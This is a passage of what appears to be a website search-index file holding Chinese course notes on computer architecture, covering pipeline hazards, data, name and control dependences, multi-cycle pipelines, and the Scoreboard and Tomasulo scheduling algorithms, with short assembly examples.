\u800c\u8017\u8d39\u7684\u5468\u671f\u4e4b\u548c\uff1a</p> <p>Pipeline CPI = Ideal Pipeline CPI + Structural Stalls + Data Hazard Stalls + Control Stalls</p> <p>Ideal Pipeline CPI \u662f\u5bf9\u80fd\u591f\u5b9e\u73b0\u7684\u6700\u4f73\u6027\u80fd\u7684\u5ea6\u91cf\uff0c\u901a\u8fc7\u7f29\u77ed\u4e0a\u5f0f\u7684\u53f3\u8fb9\u4e09\u9879 Stalls\uff0c\u6211\u4eec\u53ef\u4ee5\u964d\u4f4e\u603b\u6d41\u6c34\u7ebf CPI\u3002</p> <p>\u5bf9\u4e8e\u4e00\u6bb5\u7a0b\u5e8f\uff0c\u6211\u4eec\u6839\u636e\u8df3\u8f6c\u6307\u4ee4\u5c06\u5176\u5206\u9694\u4e3a\u4e00\u7cfb\u5217 Basic Block\uff0c\u5728\u57fa\u672c\u5757\u4e2d\u7684\u6307\u4ee4 ILP \u7684\u673a\u4f1a\u8f83\u5c11</p>"},{"location":"Courses/CA/ILP/#data-dependences-and-hazards","title":"Data Dependences and Hazards","text":"<p>\u5728\u786c\u4ef6\u8d44\u6e90\u8db3\u591f\u60c5\u51b5\u4e0b\uff0c\u6ca1\u6709\u4f9d\u8d56\u7684\u6307\u4ee4\u4e4b\u95f4\u53ef\u4ee5\u5b8c\u5168\u5e76\u884c\uff0c\u4e0d\u4f1a\u5bfc\u81f4\u4efb\u4f55\u505c\u987f\u3002</p> <p>\u53ea\u8981\u6307\u4ee4\u4e4b\u95f4\u5b58\u5728\u4f9d\u8d56\uff0c\u800c\u4e14\u5b83\u4eec\u6267\u884c\u987a\u5e8f\u63a5\u8fd1\uff0c\u4f7f\u5f97\u5bf9\u5e94\u4f9d\u8d56\u4e2d\u64cd\u4f5c\u6570\u7684\u8bbf\u95ee\u987a\u5e8f\u6539\u53d8\uff0c\u5c31\u4f1a\u5b58\u5728 Hazards\u3002</p> <p>\u6839\u636e\u6307\u4ee4\u4e2d\u8bfb\u8bbf\u95ee\u548c\u5199\u8bbf\u95ee\u7684\u987a\u5e8f\uff0c\u53ef\u4ee5\u5c06 Data Hazards \u5206\u4e3a\u4e09\u7c7b\uff1a</p> <ul> <li>RAW\uff0cRead After Write<ul> <li>\\(j\\) \u8bd5\u56fe\u5728 \\(i\\) \u5199\u5165\u6e90\u4f4d\u7f6e\u4e4b\u524d\u8bfb\u53d6\u8be5\u4f4d\u7f6e\uff0c\u4f7f \\(j\\) \u83b7\u5f97\u4e00\u4e2a\u9519\u8bef\u7684\u65e7\u503c</li> <li>\u662f\u6700\u5e38\u89c1\u7684\u5192\u9669\uff0c\u5bf9\u5e94 Data Dependence</li> </ul> </li> <li>WAW\uff0cWrite After Write<ul> <li>\\(j\\) \u8bd5\u56fe\u5728 \\(i\\) \u5199\u5165\u6e90\u4f4d\u7f6e\u4e4b\u524d\u5199\u5165\u8be5\u4f4d\u7f6e\uff0c\u4f7f\u5199\u64cd\u4f5c\u6267\u884c\u987a\u5e8f\u9519\u8bef</li> <li>\u5c5e\u4e8e Name Dependence \u7684 output dependence</li> <li>\u53ea\u6709\u5728\u5141\u8bb8\u591a\u4e2a\u6d41\u6c34\u7ea7\u8fdb\u884c\u5199\u64cd\u4f5c\u7684\u6d41\u6c34\u7ebf\u4e2d\uff0c\u6216\u8005\u5728\u524d\u4e00\u4e2a\u6307\u4ee4 Stall \u65f6\u8fd8\u5141\u8bb8\u540e\u4e00\u6761\u6307\u4ee4\u7ee7\u7eed\u6267\u884c\u7684\u6d41\u6c34\u7ebf\u4e2d\u51fa\u73b0</li> </ul> </li> <li>WAR\uff0cWrite After Read<ul> <li>\\(j\\) \u8bd5\u56fe\u5728 \\(i\\) \u8bfb\u53d6\u6e90\u4f4d\u7f6e\u4e4b\u524d\u5199\u5165\u8be5\u4f4d\u7f6e\uff0c\u4f7f \\(i\\) \u9519\u8bef\u5730\u83b7\u53d6\u65b0\u503c</li> <li>\u5c5e\u4e8e Name Dependence \u7684 antidependence</li> <li>\u5982\u679c\u67d0\u4e9b\u6307\u4ee4\u5728\u6d41\u6c34\u7ebf\u65e9\u671f\u5199\u7ed3\u679c\uff0c\u800c\u5176\u5b83\u6307\u4ee4\u5728\u6d41\u6c34\u7ebf\u540e\u671f\u8bfb\u53d6\u6e90\u4f4d\u7f6e\uff0c\u6216\u8005\u5bf9\u6307\u4ee4\u91cd\u6392\u5e8f\uff0c\u5c31\u4f1a\u53d1\u751f WAW \u5192\u9669</li> </ul> </li> </ul> <p>\u8fd9\u91cc\u5047\u8bbe\u6709\u4e24\u6761\u987a\u5e8f\u7684\u6307\u4ee4 \\(i,j\\)</p>"},{"location":"Courses/CA/ILP/#data-dependence","title":"Data Dependence","text":"<p>\u4e5f\u88ab\u79f0\u4e3a True Data Dependence</p> <p>\u5982\u679c\u4ee5\u4e0b\u4efb\u610f\u4e00\u4e2a\u6761\u4ef6\u6210\u7acb\uff0c\u5219\u79f0\u6307\u4ee4 \\(j\\) \u6570\u636e\u4f9d\u8d56\u4e8e \\(i\\)\uff1a</p> <ul> <li>\u6307\u4ee4 \\(i\\) \u751f\u6210\u7684\u7ed3\u679c\u53ef\u80fd\u4f1a\u88ab\u6307\u4ee4 \\(j\\) \u7528\u5230</li> <li>\u6307\u4ee4 \\(j\\) \u6570\u636e\u4f9d\u8d56\u4e8e\u6307\u4ee4 \\(k\\)\uff0c\u6307\u4ee4 \\(k\\) \u53c8\u6570\u636e\u4f9d\u8d56\u4e8e \\(i\\)<ul> <li>\u5373\u5b58\u5728\u4f9d\u8d56\u94fe</li> </ul> </li> </ul> <p>\u5355\u6761\u6307\u4ee4\u5185\u90e8\u7684\u4f9d\u8d56\u5982 <code>add x1, x1, x1</code> \u4e0d\u89c6\u4e3a\u4f9d\u8d56</p> <p>\u5982\u679c\u4e24\u6761\u6307\u4ee4\u6570\u636e\u4f9d\u8d56\uff0c\u5219\u5b83\u4eec\u7684\u987a\u5e8f\u4e0d\u80fd\u8c03\u6362\uff0c\u4e14\u4e0d\u80fd\u540c\u65f6\u6267\u884c\u3002</p> <p>\u5f53\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9001\u6570\u636e\u65f6\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u5224\u65ad\u68c0\u6d4b\u4e00\u4e2a\u6570\u636e\u4f9d\u8d56\u5173\u7cfb\uff0c\u4f46\u5f53\u5b58\u5728\u4e00\u4e9b\u5206\u652f\u5e72\u6270\u6216\u8005\u7f16\u8bd1\u5668\u3001\u786c\u4ef6\u4f18\u5316\u65f6\uff0c\u5224\u65ad\u4f1a\u53d8\u5f97\u7565\u5fae\u590d\u6742\u3002</p> <p>\u5f53\u901a\u8fc7\u5b58\u50a8\u5730\u5740\u4f20\u9001\u6570\u636e\u65f6\uff0c\u4e24\u4e2a\u770b\u8d77\u6765\u4e0d\u540c\u7684\u5730\u5740\u53ef\u80fd\u6307\u5411\u4e86\u540c\u4e00\u4e2a\u5730\u65b9\uff0c\u4f8b\u5982 <code>100(x4)</code> \u548c <code>20(x6)</code>\uff0c\u4e24\u4e2a\u770b\u8d77\u6765\u4e00\u6837\u7684\u5730\u5740\u4e5f\u53ef\u80fd\u6307\u5411\u4e0d\u540c\u5730\u65b9\uff0c\u4f8b\u5982 <code>20(x4)</code> \u548c <code>20(x4)</code> \uff0c\u8fd9\u4f7f\u5f97\u4f9d\u8d56\u5173\u7cfb\u7684\u68c0\u6d4b\u53d8\u5f97\u66f4\u4e3a\u590d\u6742\u3002</p>"},{"location":"Courses/CA/ILP/#name-dependence","title":"Name Dependence","text":"<p>\u5f53\u4e24\u6761\u6307\u4ee4\u4f7f\u7528\u76f8\u540c\u7684\u5bc4\u5b58\u5668\u6216\u5b58\u50a8\u5730\u5740(\u4f5c\u4e3aName)\uff0c\u4f46\u4e4b\u95f4\u6ca1\u6709\u6570\u636e\u4f9d\u8d56\u65f6\uff0c\u5c31\u4f1a\u53d1\u751f\u540d\u79f0\u4f9d\u8d56\u3002Name Dependence \u6709\u4e24\u79cd\u7c7b\u578b\uff1a</p> <ul> <li>&lt;1&gt; Antidependence<ul> <li>\u6307\u4ee4 \\(j\\) \u5c1d\u8bd5\u5bf9\u6307\u4ee4 \\(i\\) \u8981\u8bfb\u53d6\u7684\u5bc4\u5b58\u5668\u6216\u5730\u5740\u8fdb\u884c\u5199\u64cd\u4f5c\uff0c\u5373 WAR \u51b2\u7a81</li> <li>\u4e3a\u4e86\u786e\u4fdd\u6307\u4ee4 \\(i\\) \u80fd\u591f\u8bfb\u5230\u6b63\u786e\u7684\u503c\uff0c\u5fc5\u987b\u4fdd\u6301\u6307\u4ee4\u539f\u6765\u987a\u5e8f</li> </ul> </li> <li>&lt;2&gt; Output Dependence<ul> <li>\u6307\u4ee4 \\(i\\) \u548c \\(j\\) \u5c1d\u8bd5\u5bf9\u540c\u4e00\u4e2a\u5bc4\u5b58\u5668\u6216\u5730\u5740\u8fdb\u884c\u5199\u64cd\u4f5c\uff0c\u6211\u4eec\u5e0c\u671b\u6700\u540e\u7684\u503c\u4f9d\u8d56\u4e8e\u540e\u4e00\u6761\u6307\u4ee4 \\(j\\)\uff0c\u5373 WAW \u51b2\u7a81</li> </ul> </li> </ul> <pre><code>; Antidependence\nfsd  f4, 0(x1)   ; i\naddi x1, x1, -8  ; j\n\n; Output Dependence\nadd t1, t2, t3   ; i\nadd t1, t4, t5   ; j\n</code></pre> <p>\u4e0e\u6570\u636e\u4f9d\u8d56\u4e0d\u540c\uff0c\u540d\u79f0\u4f9d\u8d56\u53ef\u4ee5\u901a\u8fc7\u6539\u53d8\u51b2\u7a81\u7684\u5bc4\u5b58\u5668\u53f7\u6216\u5b58\u50a8\u5730\u5740\u6765\u4f7f\u8fd9\u4e9b\u6307\u4ee4\u4e0d\u518d\u51b2\u7a81\uff0c\u90a3\u4e48\u6d89\u53ca\u7684\u6307\u4ee4\u5c31\u53ef\u4ee5\u91cd\u65b0\u6392\u5e8f\u6216\u8005\u540c\u65f6\u6267\u884c\u3002</p> <p>\u5bf9\u4e8e\u5bc4\u5b58\u5668\u91cd\u540d\u6240\u9020\u6210\u7684\u4f9d\u8d56\uff0c\u66f4\u5bb9\u6613\u901a\u8fc7\u5bc4\u5b58\u5668\u91cd\u547d\u540d\u6253\u7834\u4f9d\u8d56\u3002\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\u5668\u9759\u6001\u6216\u8005\u786c\u4ef6\u52a8\u6001\u5904\u7406\u3002</p>"},{"location":"Courses/CA/ILP/#control-dependence","title":"Control Dependence","text":"<p>\u63a7\u5236\u4f9d\u8d56\u51b3\u5b9a\u4e86\u4e00\u4e2a\u6307\u4ee4\u76f8\u5bf9\u4e8e Branch Instruction \u7684\u987a\u5e8f\uff0c\u4e00\u4e2a\u6700\u7b80\u5355\u7684\u793a\u4f8b\u662f\uff0c\u4ee5\u4e0b\u4ee3\u7801 <code>S1</code> \u63a7\u5236\u4f9d\u8d56\u4e8e <code>p1</code>\uff0c<code>S2</code> \u63a7\u5236\u4f9d\u8d56\u4e8e <code>p2</code> \u4f46\u4e0d\u4f9d\u8d56 <code>p1</code>\uff1a</p> <pre><code>if p1\n    S1;\nif p2\n    S2;\n</code></pre> <p>\u63a7\u5236\u4f9d\u8d56\u5e76\u4e0d\u662f\u4e00\u4e2a\u5fc5\u987b\u4fdd\u6301\u7684\u5173\u952e\u7279\u6027\uff0c\u5728\u4e0d\u5f71\u54cd\u7a0b\u5e8f\u6b63\u786e\u6027\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6709\u53ef\u80fd\u5e0c\u671b\u6267\u884c\u4e00\u4e9b\u8fd8\u4e0d\u5e94\u8be5\u88ab\u6267\u884c\u7684\u6307\u4ee4\u4ee5\u51cf\u5c11 Stalls\uff0c\u4ece\u800c\u7834\u574f\u63a7\u5236\u4f9d\u8d56\u3002</p> <p>\u5bf9\u7a0b\u5e8f\u6b63\u786e\u6027\u81f3\u5173\u91cd\u8981\u7684\u4e24\u4e2a\u7279\u6027\u662f Exception Behavior \u548c Data Flow\uff0c\u8fd9\u4e5f\u662f\u7531\u6570\u636e\u4f9d\u8d56\u548c\u63a7\u5236\u4f9d\u8d56\u5171\u540c\u7ef4\u62a4\u7684\u3002</p> <ul> <li>\u4fdd\u7559\u5f02\u5e38\u884c\u4e3a\uff0c\u5373\u6539\u52a8\u6307\u4ee4\u6267\u884c\u987a\u5e8f\uff0c\u4f46\u4e0d\u80fd\u6539\u53d8\u7a0b\u5e8f\u5982\u4f55\u4ea7\u751f\u5f02\u5e38\u7684\u3002<ul> <li>\u53e6\u5916\uff0c\u5bf9\u6307\u4ee4\u6267\u884c\u7684\u91cd\u65b0\u6392\u5e8f\u4e0d\u5f97\u5bfc\u81f4\u7a0b\u5e8f\u4e2d\u51fa\u73b0\u65b0\u7684\u5f02\u5e38\u3002</li> </ul> </li> <li>\u5206\u652f\u8ba9\u6570\u636e\u6d41\u53d8\u5f97\u52a8\u6001\uff0c\u56e0\u4e3a\u4e0d\u540c\u57fa\u672c\u5757\u7684\u6570\u636e\u6e90\u4e0d\u4e00\u5b9a\u76f8\u540c\u3002\u901a\u8fc7\u4fdd\u7559\u63a7\u5236\u4f9d\u8d56\uff0c\u5c31\u80fd\u591f\u963b\u6b62\u5bf9\u6570\u636e\u6d41\u7684\u975e\u6cd5\u53d8\u5316\u3002</li> </ul>"},{"location":"Courses/CA/ILP/#techniques","title":"Techniques","text":"<p>\u8fd9\u91cc\u5148\u5bf9\u6211\u4eec\u8ba1\u7ec4\u4e2d\u5b66\u8fc7\u7684 Pipeline \u8fdb\u884c\u4e00\u4e2a\u7b80\u5355\u62d3\u5c55\u3002</p> <p>\u5728\u8ba1\u7ec4\u4e2d\uff0c\u6211\u4eec\u8ba4\u4e3a\u6d41\u6c34\u7ebf\u5404\u4e2a\u9636\u6bb5\u7684\u8017\u65f6\u5747\u662f\u76f8\u540c\u7684\uff0c\u90fd\u4e3a\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u3002\u800c\u5b9e\u9645\u4e0a\uff0c\u5728\u5f15\u5165\u6d6e\u70b9\u8ba1\u7b97\u64cd\u4f5c\u540e\uff0cEX \u9636\u6bb5\u7684\u5404\u4e2a\u64cd\u4f5c\u7684\u6d88\u8017\u53ef\u80fd\u76f8\u5dee\u5de8\u5927\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u5c06\u5176\u7ec6\u5206\uff0c\u8fdb\u4e00\u6b65\u6d41\u6c34\u7ebf\u5316\uff1a</p> <p></p> <p>\u5728 Lab5 \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6d41\u6c34\u7ebf\u88ab\u5212\u5206\u4e3a\u4e86 IF, ID, FU, WB \u56db\u7ea7\u3002\u7531\u4e8e FU \u9636\u6bb5\u64cd\u4f5c\u65f6\u95f4\u4e0d\u540c\uff0c\u6211\u4eec\u5f15\u5165\u4e24\u4e2a\u6982\u5ff5\uff1a</p> <ul> <li>Latency\uff1a\u3010\u4e0a\u4e00\u6761\u6307\u4ee4\u4ea7\u751f\u7ed3\u679c\u3011 \u4e0e\u3010\u4e0b\u4e00\u6761\u6307\u4ee4\u4f7f\u7528\u7ed3\u679c\u3011\u4e4b\u95f4\u7684\u65f6\u95f4\u95f4\u9694<ul> <li>\u901a\u5e38 latency = (FU Time - 1) cc</li> </ul> </li> <li>Initiation Interval\uff1a\u4e24\u6761\u6307\u4ee4\u53d1\u5c04\u8fdb\u5165\u540c\u4e00\u4e2a FU\uff0c\u5b83\u4eec\u4e4b\u95f4\u5fc5\u987b\u81f3\u5c11\u95f4\u9694\u591a\u5c11\u4e2a\u65f6\u949f\u5468\u671f<ul> <li>\u5982\u679c FU \u5b8c\u5168\u6d41\u6c34\u5316(Fully Pipelined)\uff0c\u90a3\u4e48 Initiation Interval = 1</li> <li>\u5982\u679c FU \u975e\u6d41\u6c34\u5316(Non Pipelined)\uff0c\u90a3\u4e48 Initiaion Interval = latency + 1</li> </ul> </li> </ul> <p></p> Integer ALUData Memory <p></p> <p></p> <p>\u8fd9\u79cd\u6d41\u6c34\u7ebf\u5b58\u5728\u4ee5\u4e0b\u6f5c\u5728\u95ee\u9898\uff1a</p> <ul> <li>\u9700\u8981\u6dfb\u52a0\u65b0\u7684\u6d41\u6c34\u7ebf\u5bc4\u5b58\u5668</li> <li>\u7531\u4e8e\u9664\u6cd5\u5668\u662f\u975e\u6d41\u6c34\u5316\u7684\uff0c\u6709\u53ef\u80fd\u53d1\u751f\u7ed3\u6784\u51b2\u7a81<ul> <li>\u4e5f\u56e0\u6b64\uff0c\u4e00\u4e2a\u9664\u6cd5\u5668\u5185\u53ea\u80fd\u540c\u65f6\u6709\u4e00\u6761\u6307\u4ee4\u5728\u8ba1\u7b97</li> <li>\u4e3a FU \u8bbe\u7f6e busy \u4f4d\uff0c\u5f00\u59cb\u6267\u884c\u7f6e 1\uff0c\u7ed3\u675f\u65f6\u7f6e 0</li> </ul> </li> <li>\u7531\u4e8e\u5404\u4e2a\u6307\u4ee4\u6267\u884c\u65f6\u95f4\u4e0d\u540c\uff1a<ul> <li>\u53ef\u80fd\u51fa\u73b0\u4e00\u4e2a\u5468\u671f\u5185\u6709\u591a\u6761\u6307\u4ee4\u8981\u540c\u65f6\u5199\u56de\u5bc4\u5b58\u5668<ul> <li>\u8bbe\u8ba1\u4e00\u4e2a\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u5982\u679c\u5f53\u524d\u5f00\u59cb\u6267\u884c\u7684\u6307\u4ee4\u5728 N \u4e2a\u65f6\u949f\u5468\u671f\u540e\u8981\u5199\u56de\uff0c\u5219\u9884\u7ea6\u5bc4\u5b58\u5668\u7b2c N \u4e2a\u4f4d\u7f6e\uff1b\u6bcf\u4e2a\u65f6\u949f\u5468\u671f\u90fd\u5411\u5de6\u79fb\u4e00\u4f4d\uff0c\u4ece\u800c\u5224\u65ad\u4ec0\u4e48\u65f6\u5019\u6709\u6307\u4ee4\u8981\u5199\u56de</li> </ul> </li> <li>\u53ef\u80fd\u51fa\u73b0\u5199\u5bc4\u5b58\u5668\u987a\u5e8f\u9519\u4e71\u95ee\u9898\uff0c\u5373 WAW \u51b2\u7a81<ul> <li>\u8bb0\u5f55\u6bcf\u4e2a FU \u8981\u5199\u56de\u4ec0\u4e48\u4f4d\u7f6e\uff0c\u540c\u65f6\u5229\u7528\u4e0a\u8ff0\u79fb\u4f4d\u5bc4\u5b58\u5668\u5224\u65ad\u5f53\u524d FU \u5728\u591a\u4e45\u540e\u5199\u56de\u3002\u5982\u679c\u6709 WAW\uff0c\u5219\u540e\u4e00\u6761\u6307\u4ee4\u9700\u7b49\u5f85\u524d\u4e00\u6761\u6307\u4ee4\u5199\u5165</li> </ul> </li> </ul> </li> <li>RAW \u51b2\u7a81\u66f4\u9891\u7e41\uff0c\u4e14\u9020\u6210\u7684\u505c\u987f\u66f4\u957f</li> <li>\u4e71\u5e8f\u5b8c\u6210\uff0c\u96be\u4ee5\u4e2d\u65ad</li> </ul> <p>\u8be5\u6d41\u6c34\u7ebf\u4e0d\u4f1a\u53d1\u751f WAR \u51b2\u7a81\uff0c\u524d\u4e00\u6761\u6307\u4ee4\u7684\u8bfb\u64cd\u4f5c\u4e00\u5b9a\u5728\u540e\u4e00\u6761\u6307\u4ee4\u7684\u5199\u64cd\u4f5c\u4e4b\u524d</p>"},{"location":"Courses/CA/ILP/#_1","title":"\u786c\u4ef6\u65b9\u6cd5","text":"<ul> <li>\u52a8\u6001\u8c03\u5ea6<ul> <li>ScoreBored</li> <li>Tomasulo</li> </ul> </li> <li>\u52a8\u6001\u5206\u652f\u9884\u6d4b<ul> <li>\u9884\u6d4b\u5668</li> <li>\u7cbe\u786e\u4e2d\u65ad\u548c ROB</li> </ul> </li> <li>\u591a\u53d1\u5c04<ul> <li>\u8d85\u6807\u91cf</li> </ul> </li> </ul>"},{"location":"Courses/CA/ILP/#dynamic-scheduling","title":"Dynamic Scheduling","text":""},{"location":"Courses/CA/ILP/#scoreboard","title":"Scoreboard \u7b97\u6cd5","text":"<p>Scoreboard \u7b97\u6cd5\u5141\u8bb8\u539f\u672c\u88ab Stall \u963b\u585e\u7684\u6307\u4ee4\u7ee7\u7eed\u5f80\u524d\u8fd0\u884c\uff0c\u5e76\u4e14\u4ecd\u7136\u7ef4\u6301\u6570\u636e\u6d41\u7684\u6b63\u786e\u6027\u3002\u5176\u52a8\u6001\u8c03\u5ea6\u7684\u3010\u52a8\u6001\u3011\u4f53\u73b0\u5728\uff1a</p> <ul> <li>\u80fd\u89e3\u51b3\u7f16\u8bd1\u65f6\u65e0\u6cd5\u786e\u5b9a\u7684\u4e00\u4e9b\u6570\u636e\u4f9d\u8d56</li> <li>\u7b80\u5316\u7f16\u8bd1\u5668\u7684\u5b9e\u73b0\uff0c\u4e0d\u540c\u7684\u67b6\u6784\u53ef\u4ee5\u5bf9\u5e94\u540c\u4e00\u79cd\u6c47\u7f16\u7684\u5b9e\u73b0<ul> <li>\u5373\u5199\u6c47\u7f16\u4ee3\u7801\u7684\u4eba\u4e0d\u9700\u8981\u77e5\u9053 scoreboard \u7684\u5177\u4f53\u8bbe\u8ba1</li> </ul> </li> </ul> <p>Scoreboard \u6d41\u6c34\u7ebf\u7684\u4e94\u4e2a\u9636\u6bb5</p> <ul> <li>IF\uff1a\u53d6\u6307\u4ee4</li> <li>IS\uff1aIssue\uff0c\u8d1f\u8d23\u89e3\u7801\u6307\u4ee4\u4ee5\u53ca\u76d1\u89c6\u7ed3\u6784\u51b2\u7a81</li> <li>RO\uff1aRead Operands\uff0c\u76d1\u89c6\u6570\u636e\u51b2\u7a81\uff0c\u8bfb\u53d6\u64cd\u4f5c\u6570</li> <li>EX\uff1a\u9001\u5230\u4e0d\u540c FU \u6267\u884c\uff0c\u8bbf\u5b58\u4e5f\u5728\u8fd9\u4e00\u9636\u6bb5</li> <li>WB\uff1a\u5199\u56de\u7ed3\u679c</li> </ul> <p>\u6211\u4eec\u4e3a Scoreboard \u7ef4\u62a4\u4e09\u5f20\u8868\uff1a</p> <ul> <li>\u6307\u4ee4\u72b6\u6001\u8868 Instruction Status Table<ul> <li>\u8bb0\u5f55\u6307\u4ee4\u7684\u72b6\u6001\uff0c\u5728\u54ea\u4e2a\u9636\u6bb5</li> </ul> </li> <li>\u529f\u80fd\u5355\u5143\u72b6\u6001\u8868 Functional Unit Status Table<ul> <li><code>busy</code>: FU \u662f\u5426\u7a7a\u95f2</li> <li><code>op</code>: FU \u6b63\u5728\u6267\u884c\u4ec0\u4e48\u64cd\u4f5c</li> <li><code>Fi</code>, <code>Fj</code>, <code>Fk</code>: FU \u7684\u64cd\u4f5c\u6570\u5bf9\u5e94\u54ea\u4e2a\u5bc4\u5b58\u5668<ul> <li><code>Fi</code> \u662f\u76ee\u7684\u5bc4\u5b58\u5668</li> </ul> </li> <li><code>Qj</code>, <code>Qk</code>: FU \u7684\u64cd\u4f5c\u6570\u5982\u679c\u6ca1\u51c6\u5907\u597d\uff0c\u5e94\u8be5\u4ece\u54ea\u4e2a FU \u4e2d\u8bfb\u53d6</li> <li><code>Rj</code>, <code>Rk</code>: FU \u7684\u64cd\u4f5c\u6570\u662f\u5426\u51c6\u5907\u597d\uff0c\u5f53\u6240\u6709\u64cd\u4f5c\u6570\u51c6\u5907\u597d\u65f6\uff0cFU \u64cd\u4f5c\u8fdb\u5165 EX \u72b6\u6001\uff0c\u8bb0\u5f97\u5c06 <code>Rj</code> \u548c <code>Rk</code> \u90fd\u6539\u4e3a NO</li> </ul> </li> <li>\u5bc4\u5b58\u5668\u72b6\u6001\u8868 Register Status Table<ul> <li>\u5982\u679c\u67d0\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u6b63\u5728\u88ab\u67d0\u4e2a FU \u64cd\u4f5c\u751f\u6210\uff0c\u5219\u586b\u5165\u8fd9\u4e2a FU \u7684\u7f16\u53f7\uff08\u7a7a\u5219\u7f6e0\uff09</li> <li>\u751f\u6210\u597d\u4e4b\u540e\uff0c\u5c06\u5b9e\u9645\u503c\u586b\u5165</li> </ul> </li> </ul> <p>\u5177\u4f53\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53bb\u7f51\u7ad9\u3001PPT\u3001\u5386\u5e74\u5377\u4e2d\u67e5\u770b\u3002\u9700\u8981\u6ce8\u610f\u51e0\u4e2a\u8981\u70b9\u5728\u4e8e\uff1a</p> <ul> <li>\u3010issue\u3011 \u4ec0\u4e48\u65f6\u5019\u4e00\u6761\u6307\u4ee4\u5141\u8bb8\u53d1\u5c04\uff1f<ul> <li>\u9700\u8981\u4f7f\u7528\u7684 FU \u662f\u7a7a\u95f2\u7684\uff0c\u907f\u514d\u7ed3\u6784\u51b2\u7a81<ul> <li>\u67e5\u529f\u80fd\u5355\u5143\u72b6\u6001\u8868</li> </ul> </li> <li>\u8be5\u6307\u4ee4\u7684 Rd \u548c\u5176\u5b83\u6b63\u5728\u6267\u884c\u7684\u6307\u4ee4\u7684 Rd \u6ca1\u6709\u91cd\u590d\uff0c\u907f\u514d WAW \u51b2\u7a81<ul> <li>\u67e5\u5bc4\u5b58\u5668\u72b6\u6001\u8868</li> </ul> </li> </ul> </li> <li>\u3010Read Operand\u3011 \u4ec0\u4e48\u65f6\u5019\u5f00\u59cb\u8bfb\u6570\uff08\u8bfb\u6570\u5b8c\u4e0b\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u5373\u4e3a EX\uff09<ul> <li>\u5f53\u4e14\u4ec5\u5f53\u4e24\u4e2a\u6e90\u5bc4\u5b58\u5668\u90fd\u51c6\u5907\u597d\u4e86\u624d\u5f00\u59cb\u8bfb\u6570\uff0c\u5373 <code>Rj</code>, <code>Rk</code> \u5747\u4e3a Yes</li> </ul> </li> <li>\u3010Write Back\u3011<ul> <li>\u5199\u56de\u65f6\u9700\u8981\u6ce8\u610f\u8be5\u76ee\u7684\u5bc4\u5b58\u5668\u662f\u5426\u5728\u67d0\u4e2a FU \u7684 Ready List \u4e2d\u4e3a Yes</li> <li>\u5982\u679c\u662f Yes\uff0c\u5219\u7b49\u8be5\u6307\u4ee4\u8bfb\u5b8c\u518d\u5199\u56de\uff0c\u907f\u514d WAR \u51b2\u7a81</li> </ul> </li> </ul> <p>Scoreboard \u7684\u7f3a\u9677</p> <ul> <li>\u6ca1\u6709\u5206\u652f\u9884\u6d4b\uff0c\u5373\u53d1\u5c04\u7a97\u53e3\u53ea\u80fd\u8986\u76d6\u4e00\u4e2a Basic Block</li> <li>FU \u7684\u6570\u91cf\u3001\u79cd\u7c7b\u548c\u5ef6\u8fdf\u662f\u74f6\u9888</li> <li>WAR \u548c WAW \u51b2\u7a81\u9700\u8981\u89e3\u51b3\uff0c\u82b1\u8d39\u5927\u91cf\u65f6\u95f4<ul> <li>\u53ef\u4ee5\u901a\u8fc7\u663e\u5f0f\u5bc4\u5b58\u5668\u91cd\u547d\u540d\u89e3\u51b3\uff0c\u51cf\u5c11\u65f6\u95f4</li> </ul> </li> <li>\u4e71\u5e8f\u5b8c\u6210\uff0c\u4e0d\u80fd\u7cbe\u786e\u4e2d\u65ad<ul> <li>\u5373\u5f02\u5e38\u53d1\u751f\u65f6\u5904\u7406\u5668\u65e0\u6cd5\u786e\u4fdd\u5f02\u5e38\u70b9\u4e4b\u524d\u7684\u6240\u6709\u6307\u4ee4\u5747\u5df2\u5b8c\u6210\uff0c\u4e14\u5f02\u5e38\u70b9\u4e4b\u540e\u7684\u6307\u4ee4\u4e5f\u5b58\u5728\u7740\u90e8\u5206\u6267\u884c\u7684\u60c5\u51b5</li> </ul> </li> </ul> <p>\u901a\u8fc7\u663e\u5f0f\u5bc4\u5b58\u5668\u91cd\u547d\u540d\u89e3\u51b3 WAR \u548c WAW \u51b2\u7a81</p> <p>ISA \u53ef\u80fd\u6ca1\u6709\u63d0\u4f9b\u8db3\u591f\u7684\u903b\u8f91\u5bc4\u5b58\u5668\uff0c\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e\u66f4\u591a\u7269\u7406\u5bc4\u5b58\u5668\uff0c\u5bf9\u6bcf\u4e00\u6761\u9700\u8981\u5199\u5bc4\u5b58\u5668\u7684\u6307\u4ee4\uff0c\u90fd\u4e3a\u5176\u5206\u914d\u4e00\u4e2a\u65b0\u7684\u7269\u7406\u5bc4\u5b58\u5668\u3002\u6307\u4ee4\u5b8c\u6210\u4e4b\u540e\uff0c\u7269\u7406\u5bc4\u5b58\u5668\u4e2d\u7684\u503c\u4f1a\u88ab\u5199\u4f1a\u903b\u8f91\u5bc4\u5b58\u5668\u3002</p> <p>\u5bf9\u4e8e\u6b64\u65b9\u6cd5\uff0c\u6211\u4eec\u9700\u8981\u7ef4\u62a4\u4e00\u4e2a free list \u8868\u793a\u662f\u5426\u6709 free \u7684\u7269\u7406\u5bc4\u5b58\u5668\uff1b\u8fd8\u8981\u7ef4\u62a4\u4e00\u4e2a\u7269\u7406\u5bc4\u5b58\u5668\u5230\u903b\u8f91\u5bc4\u5b58\u5668\u7684\u6620\u5c04\u8868\u3002</p> <p>Scoreboard \u7b97\u6cd5\u6a21\u62df\u7f51\u7ad9</p>"},{"location":"Courses/CA/ILP/#tomasulo","title":"Tomasulo \u7b97\u6cd5","text":"<p>Tamosulo \u7b97\u6cd5\u80fd\u591f\u89e3\u51b3\u4e00\u4e9b Scoreboard \u4e0d\u80fd\u5f88\u597d\u5904\u7406\u7684\u95ee\u9898\uff0c\u4f8b\u5982\uff1a</p> <pre><code>I1: LOAD R1, 0(R2)\nI2: ADD  R3, R1, R4\nI3: MUL  R1, R5, R6\n</code></pre> 